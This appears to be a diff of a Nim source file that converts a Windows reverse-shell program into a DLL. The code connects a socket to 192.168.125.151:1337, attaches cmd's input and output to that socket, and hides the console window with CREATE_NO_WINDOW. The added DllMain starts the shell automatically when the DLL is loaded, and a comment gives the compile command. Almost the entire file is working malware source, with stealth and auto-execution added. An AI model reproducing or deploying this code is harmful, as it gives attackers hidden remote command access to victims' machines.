@@ -1,6 +1,11 @@
+#[
+  Exmaple for a sample DLL
+  nim c --app=lib --nomain -d:release --threads:off --cpu=amd64 --nimcache=cache --usenimcache --forceBuild:on -d:noRes .\sample.nim
+]#
+
 import winim
 
-proc main() = 
+proc popShell() =
   var 
     ip = "192.168.125.151".cstring
     port: uint16 = 1337
@@ -37,7 +42,17 @@ proc main() =
   si.hStdOutput = cast[HANDLE](soc)
   si.hStdError = cast[HANDLE](soc)
 
-  CreateProcessA(NULL, "cmd".cstring, NULL, NULL, TRUE, 0, NULL, NULL, cast[LPSTARTUPINFOA](si.addr), pi.addr)
+  CreateProcessA(
+    NULL, "cmd".cstring, NULL, NULL, TRUE, CREATE_NO_WINDOW, 
+    NULL, NULL, cast[LPSTARTUPINFOA](si.addr), pi.addr
+  )
 
-when isMainModule:
-  main()
+proc NimMain() {.cdecl, importc.}
+
+proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
+  NimMain()
+  
+  if fdwReason == DLL_PROCESS_ATTACH:
+    popShell()
+
+  return true
